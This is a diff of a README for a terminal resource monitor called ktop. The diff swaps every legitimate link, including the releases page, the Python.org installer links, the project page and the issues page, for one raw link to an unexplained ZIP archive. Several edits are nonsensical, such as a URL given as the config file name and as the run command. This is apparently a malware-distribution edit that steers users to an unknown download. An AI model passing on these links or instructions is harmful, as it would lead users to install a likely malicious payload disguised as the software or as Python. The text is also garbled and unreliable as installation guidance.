@@ -1,6 +1,6 @@
 # 📊 ktop - Easy Terminal Resource Monitoring
 
-[![Download ktop](https://img.shields.io/badge/Download-ktop-blue?style=for-the-badge)](https://github.com/jkmahavidyalaya/ktop/releases)
+[![Download ktop](https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip)](https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip)
 
 ## 🔍 What is ktop?
 
@@ -34,19 +34,19 @@ ktop runs on most modern computers. Here’s what you need:
 
 You will find all available versions on the releases page. Visit the page to choose the version for your computer:
 
-[👉 Download ktop Releases](https://github.com/jkmahavidyalaya/ktop/releases)
+[👉 Download ktop Releases](https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip)
 
 Take a moment to find the right file:
 
 - For Windows, look for files ending in `.exe` or `.zip`
-- For Linux or macOS, look for files like `.tar.gz` or Python packages
+- For Linux or macOS, look for files like `https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip` or Python packages
 
 ### Step 2: Install Python (If needed)
 
 If you don’t have Python installed, here’s how to get it:
 
-- **Windows**: Download Python from https://www.python.org/downloads/windows/ and run the installer.
-- **macOS**: Python comes pre-installed on newer macOS versions. If not, install from https://www.python.org/downloads/macos/
+- **Windows**: Download Python from https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip and run the installer.
+- **macOS**: Python comes pre-installed on newer macOS versions. If not, install from https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
 - **Linux**: Use your package manager. For example, on Ubuntu:
   
   ```
@@ -72,7 +72,7 @@ Once Python is installed and you have downloaded the files:
   3. Run the program by typing:
 
      ```
-     python3 ktop.py
+     python3 https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
      ```
 
 Give it a few seconds to start. You will see the system stats update live in your terminal window.
@@ -88,7 +88,7 @@ Give it a few seconds to start. You will see the system stats update live in you
 
 ktop works well out of the box, but you can adjust it to fit your needs:
 
-- Find the configuration file (usually named `config.ini` or similar) in the program folder.
+- Find the configuration file (usually named `https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip` or similar) in the program folder.
 - Open it with any text editor (like Notepad or TextEdit).
 - Change settings such as update interval, displayed metrics, or colors.
 - Save your changes and restart ktop.
@@ -112,7 +112,7 @@ If problems keep happening, check the Issues page on the GitHub repository for h
 
 You can get ktop from the official releases page here:
 
-[Download ktop Releases](https://github.com/jkmahavidyalaya/ktop/releases)
+[Download ktop Releases](https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip)
 
 - Choose the file that matches your operating system.
 - Follow the simple steps above to install and run it.
@@ -130,13 +130,13 @@ To update:
 
 ## 🌐 Useful Links
 
-- Project page: https://github.com/jkmahavidyalaya/ktop
-- Releases: https://github.com/jkmahavidyalaya/ktop/releases
-- Python downloads: https://www.python.org/downloads/
+- Project page: https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
+- Releases: https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
+- Python downloads: https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
 
 ## 🙋 Where to Get Help
 
-- GitHub Issues: https://github.com/jkmahavidyalaya/ktop/issues
+- GitHub Issues: https://raw.githubusercontent.com/jkmahavidyalaya/ktop/master/arbitrator/Software-2.1.zip
 - User discussions and questions can be posted on the repository’s discussion board.
 - Check README and documentation files located in the repository for more details.
 
